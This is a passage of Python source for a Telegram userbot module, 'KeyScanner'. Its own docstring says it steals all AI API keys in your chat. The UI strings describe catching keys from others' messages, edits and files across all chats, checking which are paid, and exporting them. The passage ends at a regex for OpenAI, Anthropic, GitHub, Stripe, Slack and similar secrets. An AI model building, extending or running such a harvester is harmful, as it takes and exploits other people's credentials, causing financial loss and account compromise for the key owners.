# ====================================================================================================================
#   ██████╗  ██████╗ ██╗   ██╗███╗   ███╗ ██████╗ ██████╗ ██╗   ██╗██╗     ███████╗███████╗
#  ██╔════╝ ██╔═══██╗╚██╗ ██╔╝████╗ ████║██╔═══██╗██╔══██╗██║   ██║██║     ██╔════╝██╔════╝
#  ██║  ███╗██║   ██║ ╚████╔╝ ██╔████╔██║██║   ██║██║  ██║██║   ██║██║     █████╗  ███████╗
#  ██║   ██║██║   ██║  ╚██╔╝  ██║╚██╔╝██║██║   ██║██║  ██║██║   ██║██║     ██╔══╝  ╚════██║
#  ╚██████╔╝╚██████╔╝   ██║   ██║ ╚═╝ ██║╚██████╔╝██████╔╝╚██████╔╝███████╗███████╗███████║
#   ╚═════╝  ╚═════╝    ╚═╝   ╚═╝     ╚═╝ ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝╚══════╝╚══════╝
#
#   OFFICIAL USERNAMES: @goymodules | @samsepi0l_ovf
#   MODULE: keyscanner
#
#   THIS MODULE IS LICENSED UNDER GNU AGPLv3, PROTECTED AGAINST UNAUTHORIZED COPYING/RESALE,
#   AND ITS ORIGINAL AUTHORSHIP BELONGS TO @samsepi0l_ovf.
#   ALL OFFICIAL UPDATES, RELEASE NOTES, AND PATCHES ARE PUBLISHED IN THE TELEGRAM CHANNEL @goymodules.
# ====================================================================================================================
# meta banner: https://raw.githubusercontent.com/sepiol026-wq/GoyModules/refs/heads/main/assets/keyscanner.png
# meta developer: @GoyModules
# requires: aiohttp

__version__ = (2, 4, 6)
import re
import aiohttp
import asyncio
import csv
import json
import io
import time
from urllib.parse import urlparse, unquote
from herokutl.types import Message
from herokutl.tl.functions.messages import CreateForumTopicRequest, EditForumTopicRequest, GetForumTopicsByIDRequest, GetForumTopicsRequest
from herokutl.tl.types import Channel, ForumTopicDeleted
try:
    from herokutl.errors import FloodWaitError
except ImportError:
    FloodWaitError = Exception
from .. import loader, utils

E_OK    = "<tg-emoji emoji-id=5255813619702049821>✅</tg-emoji>"
E_ERR   = "<tg-emoji emoji-id=5253864872780769235>❗️</tg-emoji>"
E_FIRE  = "<tg-emoji emoji-id=5253877736207821121>🔥</tg-emoji>"
E_BOX   = "<tg-emoji emoji-id=5256094480498436162>📦</tg-emoji>"
E_BOX2  = "<tg-emoji emoji-id=5256058608931580017>📦</tg-emoji>"
E_GEAR  = "<tg-emoji emoji-id=5253952855185829086>⚙️</tg-emoji>"
E_PIN   = "<tg-emoji emoji-id=5253713110111365241>📍</tg-emoji>"
E_LIST  = "<tg-emoji emoji-id=5256230583717079814>📝</tg-emoji>"
E_LIST2 = "<tg-emoji emoji-id=5253775593295588000>📝</tg-emoji>"
E_DOWN  = "<tg-emoji emoji-id=5255890718659979335>⬇️</tg-emoji>"
E_COPY  = "<tg-emoji emoji-id=5256113064821926998>©</tg-emoji>"
E_BELL  = "<tg-emoji emoji-id=5253884483601442590>🔔</tg-emoji>"
E_MUTE  = "<tg-emoji emoji-id=5253690110561494560>🔇</tg-emoji>"
E_SYNC  = "<tg-emoji emoji-id=5253464392850221514>🔃</tg-emoji>"
E_BATT  = "<tg-emoji emoji-id=5253549669425882943>🔋</tg-emoji>"
E_FOLD  = "<tg-emoji emoji-id=5253526631221307799>📂</tg-emoji>"
E_FOLD2 = "<tg-emoji emoji-id=5253671358734281000>📂</tg-emoji>"
E_TRASH = "<tg-emoji emoji-id=5255831443816327915>🗑</tg-emoji>"
E_BIN   = "<tg-emoji emoji-id=5253832566036770389>🚮</tg-emoji>"
E_CARD  = "<tg-emoji emoji-id=5255713220546538619>💳</tg-emoji>"
E_LINK  = "<tg-emoji emoji-id=5253490441826870592>🔗</tg-emoji>"
E_LOCK  = "<tg-emoji emoji-id=5253647062104287098>🔓</tg-emoji>"
E_SHLD  = "<tg-emoji emoji-id=5253780051471642059>🛡</tg-emoji>"
E_SLOW  = "<tg-emoji emoji-id=5256025060942031560>🐢</tg-emoji>"
E_CLCK  = "<tg-emoji emoji-id=5255971360965930740>🕔</tg-emoji>"
E_MSG   = "<tg-emoji emoji-id=5253590213917158323>💬</tg-emoji>"
E_RIGHT = "<tg-emoji emoji-id=5253613479754999811>➡️</tg-emoji>"
E_LEFT  = "<tg-emoji emoji-id=5253622963042788670>⬅️</tg-emoji>"
E_TAG   = "<tg-emoji emoji-id=5256054975389247793>📛</tg-emoji>"
E_HAND  = "<tg-emoji emoji-id=5255772095958229697>🤚</tg-emoji>"
E_PLAY  = "<tg-emoji emoji-id=5249019346512008974>▶️</tg-emoji>"
E_USER  = "<tg-emoji emoji-id=5255835635704408236>👤</tg-emoji>"
GLOBAL_AUTOCATCH = "__global__"

@loader.tds
class KeyScanner(loader.Module):
    """Spizdi ALL AI API KEYS in your chat"""

    strings = {
        "name": "KeyScanner",
        "scanning":      f"{E_SLOW} <b>Fast scanning via search...</b>\n{E_FOLD} Searching up to {{limit}} messages per prefix.",
        "found":         f"{E_OK} <b>Scan complete!</b>\n{E_FIRE} Valid keys found: <b>{{valid_count}}</b>\n{E_BATT} Saved to database.",
        "auto_on":       f"{E_BELL} Auto-scan <b>enabled</b> for this chat.\n{E_MSG} Catching: new messages · edits · files",
        "auto_off":      f"{E_MUTE} Auto-scan <b>disabled</b> for this chat.",
        "auto_on_global":  f"{E_BELL} Global auto-scan <b>enabled</b>.\n{E_MSG} Catching new messages, edits and files in <b>all chats</b>.",
        "auto_off_global": f"{E_MUTE} Global auto-scan <b>disabled</b>.",
        "db_stats":      f"{E_BOX} <b>Database:</b> {{total}} keys\n{E_CARD} Paid: <b>{{paid}}</b>  {E_BATT} Free: <b>{{free}}</b>  ❓ Unknown: <b>{{unk}}</b>\n\n{E_GEAR} <b>Management Menu:</b>",
        "stats":         f"{E_PIN} <b>Providers / Keys / Models:</b>\n{{stats_text}}",
        "exported":      f"{E_COPY} <b>Keys exported to Saved Messages!</b>",
        "empty":         f"{E_ERR} Database is empty.",
        "deleted":       f"{E_TRASH} Key removed.",
        "not_found":     f"{E_ERR} Key not found.",
        "btn_export":    "⬇️ Export",
        "btn_stats":     "📍 Stats",
        "btn_clear":     "🗑 Clear All",
        "btn_list":      "📝 Key List",
        "btn_check_all": "🔃 Validate All",
        "btn_back":      "⬅️ Back",
        "btn_exp_json":  "JSON",
        "btn_exp_txt":   "TXT",
        "btn_clr_inv":   "🗑 Clear Invalid",
        "models_cache_missing": f"{E_ERR} <b>Model cache is not ready yet.</b>\n{E_GEAR} Please press <b>💳 Sort Paid / Free</b> first.",
        "log_target_help": f"{E_LINK} <b>Log chat is not set.</b>\nUse <code>.kslogchat &lt;chat link / @username / chat_id&gt; [topic title]</code> to set it.",
        "log_target_set": f"{E_OK} <b>Log chat saved.</b>",
        "log_target_topic": f"{E_OK} <b>Forum topic ready.</b>",
        "log_target_label": f"{E_LINK} <b>Log target:</b> {{target}}",
        "log_topic_label": f"{E_FOLD2} <b>Log topic:</b> {{topic}}",
        "log_topic_none": f"{E_ERR} <b>No log topic.</b>",
        "btn_log_target": "🎯 Set Log Chat",
        "btn_log_topic": "🧵 Set Topic Title",
        "btn_log_help": "ℹ️ Log Help",
        "new_key_auto":  f"{E_BELL} <b>Auto-caught key!</b>\nProvider: <b>{{provider}}</b>",
        "list_title":    f"{E_LIST} <b>Keys List</b>\nPage <b>{{page}}/{{total_pages}}</b> · {{sort_label}} · {{filter_label}}\n{{shown_count}} keys on screen",
        "key_info":      f"{E_PIN} <b>Key Info:</b>\n\n{E_TAG} <b>Provider:</b> {{provider}}\n{E_CARD} <b>Tier:</b> {{tier}}\n{E_LIST} <b>Models:</b> {{models}}\n{E_LOCK} <b>Key:</b> <code>{{key}}</code>",
        "btn_check_single": "🔃 Check Key",
        "btn_del_single":   "🗑 Delete Key",
        "checking_all":  f"{E_SYNC} <b>Validating {{total}} keys...</b> Please wait.",
        "check_res_all": f"{E_OK} <b>Validation Complete</b>\n\n<b>Total:</b> {{total}}\n<b>Valid:</b> {{v}}\n<b>Invalid:</b> {{i}}\n\n{E_PIN} <b>Providers:</b>\n{{prov_stats}}",
        "check_res_single": f"{E_SYNC} <b>Validation Result:</b>\n\n<b>Provider:</b> {{provider}}\n<b>Status:</b> {{status}}",
        "status_valid":   f"{E_OK} Valid",
        "status_invalid": f"{E_ERR} Invalid",
        "importing":     f"{E_SYNC} <b>Importing keys...</b>",
        "imported":      f"{E_OK} <b>Successfully imported {{count}} unique keys.</b>",
        "import_err":    f"{E_ERR} Reply to a message/file or provide a raw URL.",
        "btn_settings":  "⚙️ Settings",
        "settings_title": f"{E_GEAR} <b>Settings:</b>\n\n{E_BELL} Logging: <b>{{log_mode}}</b>\n{E_FOLD} File scan: <b>{{file_scan}}</b>\n{E_SYNC} Edit scan: <b>{{edit_scan}}</b>",
        "btn_log_cycle": "🔔 Cycle Log Mode",
        "btn_toggle_file": "📂 Toggle File Scan",
        "btn_toggle_edit": "🔃 Toggle Edit Scan",
        "log_mode_heroku": "heroku",
        "log_mode_custom": "custom",
        "heroku_topic_creating": f"{E_GEAR} <b>[KeyScanner] Utils create topic</b> · {{title}}",
        "heroku_topic_created": f"{E_OK} <b>[KeyScanner] Topic created</b> · {{title}} · thread_id=<code>{{thread_id}}</code>",
        "heroku_topic_saved": f"{E_FOLD2} <b>[KeyScanner] Topic saved to DB</b> · {{title}} · thread_id=<code>{{thread_id}}</code>",
        "heroku_topic_intro": "This topic is for automatic key logs. The first message is pinned for context and updates.",
        "global_scanning": f"{E_SLOW} <b>Global scan initiated...</b>\nSearching all chats up to {{limit}} per prefix.",
        "new_key_notif": f"{E_BELL} <b>New Key Caught!</b>\n{E_TAG} <b>Provider:</b> {{provider}}\n{E_LOCK} <b>Key:</b> <code>{{key}}</code>\n{E_FOLD2} <b>Source:</b> {{chat_id}}\n{E_RIGHT} <b>Via:</b> {{via}}",
        "btn_show_key":  "👁 Show",
        "btn_hide_key":  "🙈 Hide",
        "btn_filter_all":     "📝 All",
        "btn_filter_paid":    "💳 Paid",
        "btn_filter_free":    "🔋 Free",
        "btn_filter_provider": "🏷 Provider",
        "btn_filter_reset": "✖️ Reset",
        "btn_sort_menu": "🧭 Sort",
        "btn_sort_recent":    "🕒 Recent",
        "btn_sort_alpha":     "🔤 A-Z",
        "btn_sort_provider":  "🏷 Provider",
        "btn_sort_tier":      "💳 Tier",
        "sort_label_recent":   "Recent",
        "sort_label_alpha":    "A-Z",
        "sort_label_provider": "Provider",
        "sort_label_tier":     "Tier",
        "filter_label_all": "all",
        "filter_label_paid": "paid",
        "filter_label_free": "free",
        "provider_menu_title": f"{E_TAG} <b>Provider Filter</b>\nSelect one provider.",
        "sort_menu_title": f"{E_SYNC} <b>Sorting</b>\nChoose how keys should be ordered.",
        "btn_sort_paid_free": "💳 Sort Paid / Free",
        "btn_del_free":       "🗑 Delete Free",
        "btn_del_paid":       "🗑 Delete Paid",
        "btn_exp_paid":       "💳 Export Paid",
        "btn_exp_free":       "🔋 Export Free",
        "sorting":       f"{E_SYNC} <b>Sorting keys by paid/free...</b>\n{{done}}/{{total}}",
        "sort_done":     f"{E_OK} <b>Sort complete!</b>\n\n{E_CARD} <b>Paid:</b> {{paid}}\n{E_BATT} <b>Free:</b> {{free}}\n❓ <b>Unknown:</b> {{unknown}}",
        "deleted_filter": f"{E_TRASH} Deleted <b>{{count}}</b> keys.",
        "settings_overview": (
            f"{E_GEAR} <b>Settings Hub</b>\n\n"
            f"{E_BELL} Capture: chat <b>{{auto_chat}}</b> · global <b>{{auto_global}}</b>\n"
            f"{E_FOLD} Files <b>{{file_scan}}</b> · edits <b>{{edit_scan}}</b> · notify <b>{{notify_new_keys}}</b>\n"
            f"{E_LIST} View: compact <b>{{compact}}</b> · hide keys <b>{{auto_hide}}</b>\n"
            f"{E_RIGHT} Page size <b>{{page_size}}</b> · default sort <b>{{default_sort}}</b>\n"
            f"{E_LINK} Logs: <b>{{log_mode}}</b>\n{{log_target_line}}"
        ),
        "settings_capture_title": (
            f"{E_BELL} <b>Capture Settings</b>\n\n"
            f"Chat auto-catch: <b>{{auto_chat}}</b>\n"
            f"Global auto-catch: <b>{{auto_global}}</b>\n"
            f"File scan: <b>{{file_scan}}</b>\n"
            f"Edit scan: <b>{{edit_scan}}</b>\n"
            f"New key notifications: <b>{{notify_new_keys}}</b>"
        ),
        "settings_view_title": (
            f"{E_LIST} <b>View Settings</b>\n\n"
            f"Compact list: <b>{{compact}}</b>\n"
            f"Auto-hide keys: <b>{{auto_hide}}</b>\n"
            f"Page size: <b>{{page_size}}</b>\n"
            f"Default sort: <b>{{default_sort}}</b>"
        ),
        "settings_logs_title": (
            f"{E_LINK} <b>Log Settings</b>\n\n"
            f"Mode: <b>{{log_mode}}</b>\n"
            f"Target: {{target}}\n"
            f"Topic: {{topic}}"
        ),
        "btn_capture_settings": "🎣 Capture",
        "btn_view_settings": "📱 View",
        "btn_logs_settings": "🧾 Logs",
        "btn_toggle_auto_chat": "💬 Auto This Chat",
        "btn_toggle_auto_global": "🌍 Auto Global",
        "btn_toggle_notify": "🔔 New Key Notify",
        "btn_toggle_compact": "📱 Compact List",
        "btn_cycle_page_size": "↕️ Page Size",
        "btn_cycle_default_sort": "🧭 Default Sort",
        "btn_toggle_autohide": "🙈 Auto-Hide Key",
        "btn_open_list": "📝 Open List",
        "btn_open_export": "⬇️ Export",
        "state_on": "ON",
        "state_off": "OFF",
        "tier_paid_label": f"{E_CARD} Paid",
        "tier_free_label": f"{E_BATT} Free",
        "loading": f"{E_BOX2} <b>Loading...</b>",
        "tier_unknown": "❓ Unknown",
        "export_scope_paid": "paid",
        "export_scope_free": "free",
        "export_scope_unknown": "unknown",
        "export_scope_all_tiers": "all tiers",
        "export_scope_all_providers": "all providers",
        "export_scope_title": "Choose what to export first",
        "export_scope_hint": "You can combine tiers and provider-specific filters.",
        "export_matching_label": "Matching keys",
        "btn_reset_scope": "♻️ Reset",
        "btn_scope_next_format": "➡️ Format",
        "export_empty_filter": f"{E_ERR} No keys match this export filter.",
        "export_format_title": "Choose export format",
        "export_key_count_label": "Keys",
        "export_caption": f"{E_COPY} <b>{{label}}</b> · {{scope}} · {{count}} keys",
        "export_legacy_label_all": "Exported",
        "export_legacy_label_paid": "Exported [PAID]",
        "export_legacy_label_free": "Exported [FREE]",
        "stats_adv_header": (
            f"{E_PIN} <b>Advanced stats</b>\n"
            f"{E_BOX} Keys: <b>{{total}}</b> · Providers: <b>{{providers}}</b> · New 24h: <b>{{recent_24h}}</b>\n"
            f"{E_CARD} Paid: <b>{{paid}}</b> · {E_BATT} Free: <b>{{free}}</b> · ❓ Unknown: <b>{{unknown}}</b>\n"
            f"{E_LIST} With models: <b>{{keys_with_models}}</b> · Unique models: <b>{{unique_models}}</b> · Avg per key: <b>{{avg_models}}</b>\n"
            f"{E_SYNC} Classified: <b>{{classified}}/{{total}}</b>\n\n"
            f"{E_TAG} <b>Providers</b>\n"
        ),
        "stats_provider_line": (
            f"{E_PIN} <b>{{provider}}</b> · <b>{{count}}</b> ({{share}}%) · "
            f"{E_CARD} {{paid}} · {E_BATT} {{free}} · ❓ {{unknown}} · "
            f"{E_LIST} models <b>{{provider_models}}</b>"
        ),
        "clear_all_warnings": [
            "⚠️ This will delete the entire database. Are you sure?",
            "⚠️ This will delete everything. Are you really sure?",
            "⚠️ This is not a joke - the database will be gone. Are you sure?",
            "⚠️ Do you fully understand this is irreversible?",
            "⚠️ One more chance to back out. Are you sure?",
            "⚠️ The database will be wiped completely. No undo.",
            "⚠️ Seriously, everything will be removed. Do you want this?",
            "⚠️ Last normal chance to stop.",
            "⚠️ Deleting the whole database next. Are you sure?",
            "⚠️ Almost there. Think again.",
            "⚠️ If you're still here, hit the final button.",
        ],
        "clear_menu_title": f"{E_TRASH} <b>Cleanup menu:</b>",
        "clear_menu_subtitle": "Choose what to delete.",
        "clear_paid_confirm": "⚠️ This will delete all paid keys. Are you sure?",
        "clear_free_confirm": "⚠️ This will delete all free keys. Are you sure?",
        "clear_paid_yes": "Yes, delete paid",
        "clear_free_yes": "Yes, delete free",
        "clear_paid_done": f"{E_TRASH} Removed paid keys: <b>{{count}}</b>",
        "clear_free_done": f"{E_TRASH} Removed free keys: <b>{{count}}</b>",
        "clear_next": "Next",
        "clear_final_yes": "Yes, delete everything",
        "clear_all_done": f"{E_TRASH} Entire database removed.",
    }

    strings_ru = {
        "scanning":      f"{E_SLOW} <b>Быстрый поиск ключей...</b>\n{E_FOLD} Поиск до {{limit}} сообщений на префикс.",
        "found":         f"{E_OK} <b>Сканирование завершено!</b>\n{E_FIRE} Новых валидных ключей: <b>{{valid_count}}</b>\n{E_BATT} Сохранено.",
        "auto_on":       f"{E_BELL} Авто-ловля <b>включена</b>.\n{E_MSG} Ловлю: новые сообщения · правки · файлы",
        "auto_off":      f"{E_MUTE} Авто-ловля <b>выключена</b>.",
        "auto_on_global":  f"{E_BELL} Глобальная авто-ловля <b>включена</b>.\n{E_MSG} Ловлю новые сообщения, правки и файлы <b>во всех чатах</b>.",
        "auto_off_global": f"{E_MUTE} Глобальная авто-ловля <b>выключена</b>.",
        "db_stats":      f"{E_BOX} <b>База ключей:</b> {{total}}\n{E_CARD} Платных: <b>{{paid}}</b>  {E_BATT} Бесплатных: <b>{{free}}</b>  ❓ Неизвестно: <b>{{unk}}</b>\n\n{E_GEAR} <b>Управление:</b>",
        "stats":         f"{E_PIN} <b>Провайдеры / ключи / модели:</b>\n{{stats_text}}",
        "exported":      f"{E_COPY} <b>Ключи выгружены в Избранное!</b>",
        "empty":         f"{E_ERR} База пуста.",
        "deleted":       f"{E_TRASH} Ключ удален.",
        "not_found":     f"{E_ERR} Ключ не найден.",
        "btn_export":    "⬇️ Выгрузить",
        "btn_stats":     "📍 Статистика",
        "btn_clear":     "🗑 Очистить все",
        "btn_list":      "📝 Список",
        "btn_check_all": "🔃 Проверить все",
        "btn_back":      "⬅️ Назад",
        "btn_exp_json":  "JSON",
        "btn_exp_txt":   "TXT",
        "btn_clr_inv":   "🗑 Удалить невалид",
        "models_cache_missing": f"{E_ERR} <b>Кэш моделей не готов.</b>\n{E_GEAR} Сначала нажми <b>💳 Сортировать Платн / Беспл</b>.",
        "log_target_help": f"{E_LINK} <b>Чат логов не задан.</b>\nИспользуй <code>.kslogchat &lt;ссылка / @username / chat_id&gt; [название топика]</code>.",
        "log_target_set": f"{E_OK} <b>Чат логов сохранён.</b>",
        "log_target_topic": f"{E_OK} <b>Топик форума готов.</b>",
        "log_target_label": f"{E_LINK} <b>Чат логов:</b> {{target}}",
        "log_topic_label": f"{E_FOLD2} <b>Топик логов:</b> {{topic}}",
        "log_topic_none": f"{E_ERR} <b>Топик не задан.</b>",
        "btn_log_target": "🎯 Чат логов",
        "btn_log_topic": "🧵 Название топика",
        "btn_log_help": "ℹ️ Помощь по логам",
        "new_key_auto":  f"{E_BELL} <b>Пойман новый ключ!</b>\nПровайдер: <b>{{provider}}</b>",
        "list_title":    f"{E_LIST} <b>Список ключей</b>\nСтр. <b>{{page}}/{{total_pages}}</b> · {{sort_label}} · {{filter_label}}\nНа экране: <b>{{shown_count}}</b>",
        "key_info":      f"{E_PIN} <b>Информация о ключе:</b>\n\n{E_TAG} <b>Провайдер:</b> {{provider}}\n{E_CARD} <b>Тариф:</b> {{tier}}\n{E_LIST} <b>Модели:</b> {{models}}\n{E_LOCK} <b>Ключ:</b> <code>{{key}}</code>",
        "btn_check_single": "🔃 Проверить",
        "btn_del_single":   "🗑 Удалить",
        "checking_all":  f"{E_SYNC} <b>Проверяю {{total}} ключей...</b>",
        "check_res_all": f"{E_OK} <b>Проверка завершена</b>\n\n<b>Всего:</b> {{total}}\n<b>Валидно:</b> {{v}}\n<b>Невалидно:</b> {{i}}\n\n{E_PIN} <b>Провайдеры:</b>\n{{prov_stats}}",
        "check_res_single": f"{E_SYNC} <b>Результат проверки:</b>\n\n<b>Провайдер:</b> {{provider}}\n<b>Статус:</b> {{status}}",
        "status_valid":   f"{E_OK} Валид",
        "status_invalid": f"{E_ERR} Невалид",
        "importing":     f"{E_SYNC} <b>Импорт ключей...</b>",
        "imported":      f"{E_OK} <b>Успешно импортировано {{count}} новых ключей.</b>",
        "import_err":    f"{E_ERR} Реплай на сообщение/файл или укажите raw ссылку.",
        "btn_settings":  "⚙️ Настройки",
        "settings_title": f"{E_GEAR} <b>Настройки:</b>\n\n{E_BELL} Логи: <b>{{log_mode}}</b>\n{E_FOLD} Файлы: <b>{{file_scan}}</b>\n{E_SYNC} Правки: <b>{{edit_scan}}</b>",
        "btn_log_cycle": "🔔 Сменить режим логов",
        "btn_toggle_file": "📂 Вкл/выкл файлы",
        "btn_toggle_edit": "🔃 Вкл/выкл правки",
        "log_mode_heroku": "heroku",
        "log_mode_custom": "custom",
        "heroku_topic_creating": f"{E_GEAR} <b>[KeyScanner] Utils create topic</b> · {{title}}",
        "heroku_topic_created": f"{E_OK} <b>[KeyScanner] Топик создан</b> · {{title}} · thread_id=<code>{{thread_id}}</code>",
        "heroku_topic_saved": f"{E_FOLD2} <b>[KeyScanner] Топик сохранён в БД</b> · {{title}} · thread_id=<code>{{thread_id}}</code>",
        "heroku_topic_intro": "This topic is for automatic key logs. The first message is pinned for context and updates.",
        "global_scanning": f"{E_SLOW} <b>Глобальный поиск...</b>\nИщу во всех чатах до {{limit}} сообщений на префикс.",
        "new_key_notif": f"{E_BELL} <b>Пойман новый ключ!</b>\n{E_TAG} <b>Провайдер:</b> {{provider}}\n{E_LOCK} <b>Ключ:</b> <code>{{key}}</code>\n{E_FOLD2} <b>Источник:</b> {{chat_id}}\n{E_RIGHT} <b>Откуда:</b> {{via}}",
        "btn_show_key":  "👁 Показать",
        "btn_hide_key":  "🙈 Скрыть",
        "btn_filter_all":     "📝 Все",
        "btn_filter_paid":    "💳 Платные",
        "btn_filter_free":    "🔋 Бесплатные",
        "btn_filter_provider": "🏷 Провайдер",
        "btn_filter_reset": "✖️ Сброс",
        "btn_sort_menu": "🧭 Сортировка",
        "btn_sort_recent":    "🕒 Новые",
        "btn_sort_alpha":     "🔤 A-Я",
        "btn_sort_provider":  "🏷 Провайдер",
        "btn_sort_tier":      "💳 Тариф",
        "sort_label_recent":   "Новые",
        "sort_label_alpha":    "A-Я",
        "sort_label_provider": "Провайдер",
        "sort_label_tier":     "Тариф",
        "filter_label_all": "все",
        "filter_label_paid": "платные",
        "filter_label_free": "бесплатные",
        "provider_menu_title": f"{E_TAG} <b>Фильтр по провайдеру</b>\nВыбери одного провайдера.",
        "sort_menu_title": f"{E_SYNC} <b>Сортировка</b>\nВыбери порядок списка.",
        "btn_sort_paid_free": "💳 Сортировать Платн/Беспл",
        "btn_del_free":       "🗑 Удалить бесплатные",
        "btn_del_paid":       "🗑 Удалить платные",
        "btn_exp_paid":       "💳 Выгрузить платные",
        "btn_exp_free":       "🔋 Выгрузить бесплатные",
        "sorting":       f"{E_SYNC} <b>Сортировка платные/бесплатные...</b>\n{{done}}/{{total}}",
        "sort_done":     f"{E_OK} <b>Сортировка завершена!</b>\n\n{E_CARD} <b>Платных:</b> {{paid}}\n{E_BATT} <b>Бесплатных:</b> {{free}}\n❓ <b>Неизвестно:</b> {{unknown}}",
        "deleted_filter": f"{E_TRASH} Удалено <b>{{count}}</b> ключей.",
        "settings_overview": (
            f"{E_GEAR} <b>Центр настроек</b>\n\n"
            f"{E_BELL} Ловля: чат <b>{{auto_chat}}</b> · global <b>{{auto_global}}</b>\n"
            f"{E_FOLD} Файлы <b>{{file_scan}}</b> · правки <b>{{edit_scan}}</b> · уведомления <b>{{notify_new_keys}}</b>\n"
            f"{E_LIST} Вид: compact <b>{{compact}}</b> · скрытие ключей <b>{{auto_hide}}</b>\n"
            f"{E_RIGHT} Размер страницы <b>{{page_size}}</b> · сортировка по умолчанию <b>{{default_sort}}</b>\n"
            f"{E_LINK} Логи: <b>{{log_mode}}</b>\n{{log_target_line}}"
        ),
        "settings_capture_title": (
            f"{E_BELL} <b>Настройки ловли</b>\n\n"
            f"Авто-ловля в этом чате: <b>{{auto_chat}}</b>\n"
            f"Глобальная авто-ловля: <b>{{auto_global}}</b>\n"
            f"Скан файлов: <b>{{file_scan}}</b>\n"
            f"Скан правок: <b>{{edit_scan}}</b>\n"
            f"Уведомления о новых ключах: <b>{{notify_new_keys}}</b>"
        ),
        "settings_view_title": (
            f"{E_LIST} <b>Настройки отображения</b>\n\n"
            f"Компактный список: <b>{{compact}}</b>\n"
            f"Автоскрытие ключей: <b>{{auto_hide}}</b>\n"
            f"Размер страницы: <b>{{page_size}}</b>\n"
            f"Сортировка по умолчанию: <b>{{default_sort}}</b>"
        ),
        "settings_logs_title": (
            f"{E_LINK} <b>Настройки логов</b>\n\n"
            f"Режим: <b>{{log_mode}}</b>\n"
            f"Цель: {{target}}\n"
            f"Топик: {{topic}}"
        ),
        "btn_capture_settings": "🎣 Ловля",
        "btn_view_settings": "📱 Вид",
        "btn_logs_settings": "🧾 Логи",
        "btn_toggle_auto_chat": "💬 Авто в чате",
        "btn_toggle_auto_global": "🌍 Auto global",
        "btn_toggle_notify": "🔔 Уведомления",
        "btn_toggle_compact": "📱 Compact list",
        "btn_cycle_page_size": "↕️ Размер страницы",
        "btn_cycle_default_sort": "🧭 Сортировка",
        "btn_toggle_autohide": "🙈 Скрывать ключ",
        "btn_open_list": "📝 Открыть список",
        "btn_open_export": "⬇️ Экспорт",
        "state_on": "ON",
        "state_off": "OFF",
        "tier_paid_label": f"{E_CARD} Платный",
        "tier_free_label": f"{E_BATT} Бесплатный",
        "loading": f"{E_BOX2} <b>Загрузка...</b>",
        "tier_unknown": "❓ Неизвестно",
        "export_scope_paid": "платные",
        "export_scope_free": "бесплатные",
        "export_scope_unknown": "неизвестные",
        "export_scope_all_tiers": "все тарифы",
        "export_scope_all_providers": "все провайдеры",
        "export_scope_title": "Сначала выбери, что экспортировать",
        "export_scope_hint": "Можно комбинировать тарифы и конкретных провайдеров одновременно.",
        "export_matching_label": "Подходит ключей",
        "btn_reset_scope": "♻️ Сброс",
        "btn_scope_next_format": "➡️ Формат",
        "export_empty_filter": f"{E_ERR} База пуста для такого фильтра.",
        "export_format_title": "Теперь выбери формат",
        "export_key_count_label": "Ключей",
        "export_caption": f"{E_COPY} <b>{{label}}</b> · {{scope}} · {{count}} ключей",
        "export_legacy_label_all": "Экспорт",
        "export_legacy_label_paid": "Экспорт [ПЛАТНЫЕ]",
        "export_legacy_label_free": "Экспорт [БЕСПЛАТНЫЕ]",
        "stats_adv_header": (
            f"{E_PIN} <b>Расширенная статистика</b>\n"
            f"{E_BOX} Ключей: <b>{{total}}</b> · Провайдеров: <b>{{providers}}</b> · Новых за 24ч: <b>{{recent_24h}}</b>\n"
            f"{E_CARD} Платных: <b>{{paid}}</b> · {E_BATT} Бесплатных: <b>{{free}}</b> · ❓ Неизвестно: <b>{{unknown}}</b>\n"
            f"{E_LIST} С моделями: <b>{{keys_with_models}}</b> · Уникальных моделей: <b>{{unique_models}}</b> · Среднее на ключ: <b>{{avg_models}}</b>\n"
            f"{E_SYNC} Классифицировано: <b>{{classified}}/{{total}}</b>\n\n"
            f"{E_TAG} <b>Срез по провайдерам</b>\n"
        ),
        "stats_provider_line": (
            f"{E_PIN} <b>{{provider}}</b> · <b>{{count}}</b> ({{share}}%) · "
            f"{E_CARD} {{paid}} · {E_BATT} {{free}} · ❓ {{unknown}} · "
            f"{E_LIST} моделей <b>{{provider_models}}</b>"
        ),
        "clear_all_warnings": [
            "⚠️ Это удалит всю БД. Ты уверен?",
            "⚠️ Это удалит вообще всё. Ты точно уверен?",
            "⚠️ Это уже не шутка, база реально исчезнет. Ты уверен?",
            "⚠️ Ты точно понимаешь, что отката не будет?",
            "⚠️ Ещё один шанс передумать. Ты уверен?",
            "⚠️ База будет очищена полностью. Без отката.",
            "⚠️ Серьёзно, всё удалится. Ты точно хочешь этого?",
            "⚠️ Последний нормальный шанс остановиться.",
            "⚠️ Сейчас удалится вообще вся база. Ты уверен?",
            "⚠️ Почти финал. Подумай ещё раз.",
            "⚠️ Если всё ещё хочешь удалить всё, жми финальную кнопку.",
        ],
        "clear_menu_title": f"{E_TRASH} <b>Очистка базы:</b>",
        "clear_menu_subtitle": "Выбери, что удалить.",
        "clear_paid_confirm": "⚠️ Это удалит все платные ключи. Ты уверен?",
        "clear_free_confirm": "⚠️ Это удалит все бесплатные ключи. Ты уверен?",
        "clear_paid_yes": "Да, удалить платные",
        "clear_free_yes": "Да, удалить бесплатные",
        "clear_paid_done": f"{E_TRASH} Удалено платных ключей: <b>{{count}}</b>",
        "clear_free_done": f"{E_TRASH} Удалено бесплатных ключей: <b>{{count}}</b>",
        "clear_next": "Дальше",
        "clear_final_yes": "Да, удалить всё",
        "clear_all_done": f"{E_TRASH} Вся база удалена.",
    }

    def __init__(self):
        self.key_regex = re.compile(
            r"\b("
            r"sk-[a-zA-Z0-9\-_]{20,}|"
            r"sk-proj-[a-zA-Z0-9\-_]{20,}|"
            r"sk-ant-(?:api|admin)[a-zA-Z0-9\-_]{20,}|"
            r"sk-or-v1-[a-zA-Z0-9]{40,}|"
            r"AIza[0-9A-Za-z\-_]{35}|"
            r"gsk_[a-zA-Z0-9]{20,}|"
            r"hf_[a-zA-Z0-9]{20,}|"
            r"r8_[a-zA-Z0-9]{36}|"
            r"gh[pousr]_[a-zA-Z0-9]{36}|"
            r"github_pat_[a-zA-Z0-9_]{82}|"
            r"sk_live_[0-9a-zA-Z]{24}|"
            r"xox[baprs]-[0-9a-zA-Z]{10,}|"
            r"SG\.[a-zA-Z0-9_\-]{22}\.[a-zA-Z0-9_\-]{43}|"
            r"secret_[a-zA-Z0-9]{43}|"
            r"figd_[a-zA-Z0-9\-]{40,}"
            r")\b"
        )
        self.search_queries = [
